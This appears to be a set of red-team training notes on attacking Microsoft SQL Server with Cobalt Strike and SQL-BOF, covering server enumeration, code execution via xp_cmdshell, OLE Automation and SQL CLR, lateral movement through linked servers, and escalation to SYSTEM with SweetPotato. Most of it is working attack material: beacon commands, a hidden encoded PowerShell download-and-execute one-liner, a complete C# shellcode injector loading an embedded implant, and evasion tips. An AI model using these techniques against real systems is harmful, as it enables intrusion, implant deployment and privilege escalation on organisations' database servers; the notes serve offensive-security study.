MS SQL (Structured Query Language) Server is Microsoft's proprietary relational database management system.

## Interaction

Popular tools to interact with MS SQL servers include [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL), [SQLRecon](https://github.com/skahwah/SQLRecon), [SQL-BOF](https://github.com/Tw1sm/SQL-BOF), [sqlcmd](https://github.com/microsoft/go-sqlcmd), [HeidiSQL](https://www.heidisql.com/), and [SSMS](https://learn.microsoft.com/en-us/ssms/download-sql-server-management-studio-ssms).

This lesson uses [SQL-BOF](https://github.com/Tw1sm/SQL-BOF). 
```powershell
Load Aggressor script first
Cobalt Strike > Script Manager
Load -> `C:\Tools\SQL-BOF\SQL\SQL.cna`
```

## Enumeration
Identify Servers
```powershell
# Query MSSQL servers vis SPN
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName

# Identify MSSQL servers via port scan
beacon> portscan 10.10.120.0/23 1433 arp 1024
```

SQL Server info
```powershell
# NO ROLE REQUIRED. Collect SQLBrowser info (1434/UDP, very minimal information)
beacon> sql-1434udp 10.10.120.20

# If we have a public role, we can collect more info on SQL server
beacon> sql-info [DB hostname]

# Query current user's rights
beacon> sql-whoami [DB hostname]
```

Querying - possible if we have a public role
```powershell
# Query syntax
beacon> sql-query [DB hostname] "SELECT @@SERVERNAME"

# Some SQL-BOF commands
sql-databases - list the available databases.
sql-tables - list the tables in a given database.
sql-columns - list the columns in a given table.
sql-search - search for columns in the given database that contain a keyword.
```


## Code Execution
There's not much we can do to abuse a SQL instance without sysadmin privileges.  Each of the techniques discussed in this lesson are disabled by default on new SQL server installations, but they can be enabled by a sysadmin.

OPSEC Note: SQL CLR > OLE Automation > xp_cmdshell
#### xp_cmdshell
It spawns a command shell, passes the string for execution, and returns any output as rows of text.

Abusing xp_cmdshell
```powershell
# Query if xp_cmdshell is already enabled
beacon> sql-query [DB hostname] "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"   # Enabled = 1, Disabled = 0

# Enable
beacon> sql-enablexp [DB hostname]

# Execute Commands
beacon> sql-xpcmd [DB hostname] "hostname && whoami"

# Cleanup
beacon> sql-disablexp [DB hostname]
```
#### OLE Automation
Object Linking and Embedding (OLE) is a technology that allows one application to link objects into another application. OLE Automation enables a SQL server to interact with arbitrary COM objects.
	**[sp_OACreate](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql)** - Creates an instance of an OLE object.
	**[sp_OADestroy](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oadestroy-transact-sql)** - Destroys a created OLE object.
	**[sp_OAGetErrorInfo](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oageterrorinfo-transact-sql)** - Obtains OLE Automation error information.
	**[sp_OAGetProperty](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oagetproperty-transact-sql)** - Gets a property value of an OLE object.
	**[sp_OAMethod](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oamethod-transact-sql)** - Calls a method of an OLE object.
	**[sp_OASetProperty](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oasetproperty-transact-sql)** - Sets a property of an OLE object to a new value.
	**[sp_OAStop](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oastop-transact-sql)** - Stops the OLE Automation stored procedure execution environment.

Abusing OLE Automation
```powershell
# Check that OLE Automation is enabled.
beacon> sql-query [DB hostname] "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"

# Enable
beacon> sql-enableole [DB hostname]

# Execute commands NOTE: output is not displayed, so one-liners only!!!
beacon> sql-olecmd [DB hostname] "cmd /c calc"

## Example way to abuse.
# Host payload on Cobalt's web server
Cobalt Strike > Scripted Web Delivery > host payload

# Set up reverse port forward
beacon> rportfwd 8080 localhost 80

# Create powershell one-liner to grab it through reverse port forward
PS C:\Users\Attacker> $cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'
PS C:\Users\Attacker> [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

# execute one-liner on 
beacon> sql-olecmd [DB hostname] "cmd /c powershell -w hidden -nop -enc [ONE-LINER]"

# Verify successful payload grab
View > Web log

# Link to new beacon
beacon> link [DB hostname] TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337 # PIPE depends on payload

# Cleanup
beacon> sql-disableole [DB hostname]
```

#### SQL Common Language Runtime
SQL Server 2005 introduced a feature called SQL Common Language Runtime (CLR), which integrated the .NET Framework. Allows stored procedures to be written in any .NET language and invoked like any normal procedure.

For a method written in C# to be compatible with SQL CLR, it must be in a partial class called  StoredProcedures and decorated with the SqlProcedureAttribute. The sky is the limit.

General format
```C#
// General format
public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        // my code here
    }
}
```

Abusing SQL CLR (example)
```powershell
# Check if SQL CLR is enabled
beacon> sql-query [DB host] "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"

# enable
beacon> sql-enableclr [DB host]

# Create payload (Skip if you have one already)
Visual Studio > new Class Library (.NET framework)
	Project Name : MyProcedure
	Place in same directory : Checked
Add smb_x64.xthread.bin as an embedded resourse # x64 & xthread!!!!
Paste code (see code example below)
Release > Build Solution

# Load and execute the assembly 
beacon> sql-clr [DB hostname] C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\MyProcedure.dll MyProcedure # Whatever you name it will change what you put here...

# Establish link (2 examples)
beacon> link [DB hostname] TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337 
	# PIPE depends on payload -- See Cobalt strike > listeners
	# SMB payload requires we have CIFS... if we have MSSQL ticket, we might consider a TCP payload that we then connect to
beacon> connect [db host] 4444

# Cleanup
beacon> sql-disableclr [DB hostname]
```
###### Examples of code
Example used in lab - Injection so beacon runs inside MSSQL process (`modify the smb_x64 bits if using a different payload like tcp...)`
```c#
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var assembly = Assembly.GetExecutingAssembly();

        byte[] shellcode;

        // read embedded payload
        using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
        {
            using (var ms = new MemoryStream())
            {
                rs.CopyTo(ms);
                shellcode = ms.ToArray();
            }
        }

        // allocate memory
        var hMemory = VirtualAlloc(
            IntPtr.Zero,
            (uint)shellcode.Length,
            VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
            PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

        // copy shellcode
        WriteProcessMemory(
            new IntPtr(-1),
            hMemory,
            shellcode,
            (uint)shellcode.Length,
            out _);

        // create thread
        var hThread = CreateThread(
            IntPtr.Zero,
            0,
            hMemory,
            IntPtr.Zero,
            THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
            out _);

        // close thread handle
        CloseHandle(hThread);
    }

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        VIRTUAL_ALLOCATION_TYPE flAllocationType,
        PAGE_PROTECTION_FLAGS flProtect);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out uint lpNumberOfBytesWritten);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        THREAD_CREATION_FLAGS dwCreationFlags,
        out uint lpThreadId);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern bool CloseHandle(IntPtr hObject);

    [Flags]
    public enum VIRTUAL_ALLOCATION_TYPE : uint
    {
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000,
        MEM_RESET = 0x00080000,
        MEM_RESET_UNDO = 0x01000000,
        MEM_REPLACE_PLACEHOLDER = 0x00004000,
        MEM_LARGE_PAGES = 0x20000000,
        MEM_RESERVE_PLACEHOLDER = 0x00040000,
        MEM_FREE = 0x00010000,
    }

    [Flags]
    public enum PAGE_PROTECTION_FLAGS : uint
    {
        PAGE_NOACCESS = 0x00000001,
        PAGE_READONLY = 0x00000002,
        PAGE_READWRITE = 0x00000004,
        PAGE_WRITECOPY = 0x00000008,
        PAGE_EXECUTE = 0x00000010,
        PAGE_EXECUTE_READ = 0x00000020,
        PAGE_EXECUTE_READWRITE = 0x00000040,
        PAGE_EXECUTE_WRITECOPY = 0x00000080,
        PAGE_GUARD = 0x00000100,
        PAGE_NOCACHE = 0x00000200,
        PAGE_WRITECOMBINE = 0x00000400,
        PAGE_GRAPHICS_NOACCESS = 0x00000800,
        PAGE_GRAPHICS_READONLY = 0x00001000,
        PAGE_GRAPHICS_READWRITE = 0x00002000,
        PAGE_GRAPHICS_EXECUTE = 0x00004000,
        PAGE_GRAPHICS_EXECUTE_READ = 0x00008000,
        PAGE_GRAPHICS_EXECUTE_READWRITE = 0x00010000,
        PAGE_GRAPHICS_COHERENT = 0x00020000,
        PAGE_GRAPHICS_NOCACHE = 0x00040000,
        PAGE_ENCLAVE_THREAD_CONTROL = 0x80000000,
        PAGE_REVERT_TO_FILE_MAP = 0x80000000,
        PAGE_TARGETS_NO_UPDATE = 0x40000000,
        PAGE_TARGETS_INVALID = 0x40000000,
        PAGE_ENCLAVE_UNVALIDATED = 0x20000000,
        PAGE_ENCLAVE_MASK = 0x10000000,
        PAGE_ENCLAVE_DECOMMIT = 0x10000000,
        PAGE_ENCLAVE_SS_FIRST = 0x10000001,
        PAGE_ENCLAVE_SS_REST = 0x10000002,
        SEC_PARTITION_OWNER_HANDLE = 0x00040000,
        SEC_64K_PAGES = 0x00080000,
        SEC_FILE = 0x00800000,
        SEC_IMAGE = 0x01000000,
        SEC_PROTECTED_IMAGE = 0x02000000,
        SEC_RESERVE = 0x04000000,
        SEC_COMMIT = 0x08000000,
        SEC_NOCACHE = 0x10000000,
        SEC_WRITECOMBINE = 0x40000000,
        SEC_LARGE_PAGES = 0x80000000,
        SEC_IMAGE_NO_EXECUTE = 0x11000000,
    }

    [Flags]
    public enum THREAD_CREATION_FLAGS : uint
    {
        THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
        THREAD_CREATE_SUSPENDED = 0x00000004,
        STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
    }
}
```

Powershell
```C#
public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var psi = new ProcessStartInfo
        {
            FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            Arguments = "-w hidden -nop -enc ..."
        };
        
        Process.Start(psi);
    }
}
```

 Shellcode injector via P/Invoke
 ```C#
 public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        // VirtualAlloc
        // WriteProcessMemory
        // CreateThread
    }
}
 ```
## Linked Servers
SQL server links can be used to connect a SQL instance with additional data sources, including other SQL servers. Its possible to enumerate links a server has with over SQL instances and exploit to move laterally

Lateral Movement using Linked Servers
```powershell
# Identify any present links
beacon> sql-links [DB hostname 1]

# Query linked SQL server syntax
beacon> sql-query [DB hostname 1] "SELECT @@SERVERNAME" "" [DB hostname 2]

# Query user permissions on linked SQL server
beacon> sql-whoami [DB hostname 1] "" [DB hostname 2] # privs depend on how link is configured

# Check if RPC Out is enabled on link (Required for xp_cmdshell, OLE, or SQL CLR)
beacon> sql-checkrpc [DB hostname 1]                    # check
beacon> sql-enablerpc [DB hostname 1] [DB hostname 2]   # enable on 2

# Code Execution (SQL-CLR example but any work if enabled)
beacon> sql-clr [DB hostname 1] C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure "" [DB hostname 2]

# Link ( Can link from any beacon )
beacon> link [DB hostname 2] [PIPE]
```
![[Pasted image 20260101135240.png]]

## Privilege Escalation
As we saw at the end of the last lesson, the lon-db-2 SQL instance is run under the context of a service account by the name MSSQLSERVER.

NT Service\MSSQLSERVER
	Local perms are limited by design
	but often have interesting token privileges

Checking Token Privileges
```powershell
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\rele\Seatbelt.exe TokenPrivileges
```

OPSEC NOTE: Requires us to execute a program on disk. Be very careful with this... name it well

Abusing SeImpersonatePrivilege w/ [SweetPotato](https://github.com/CCob/SweetPotato) 
```powershell
beacon> cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\tcp-local_x64.exe
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"

beacon> connect localhost 1337
```
![[Pasted image 20260101140927.png]]
How does this work?
	SweetPotato creates a named pipe and coerces SYSTEM process to connect to it.
	Impersonates access token of SYSTEM process, then spawns another process as SYSTEM.
	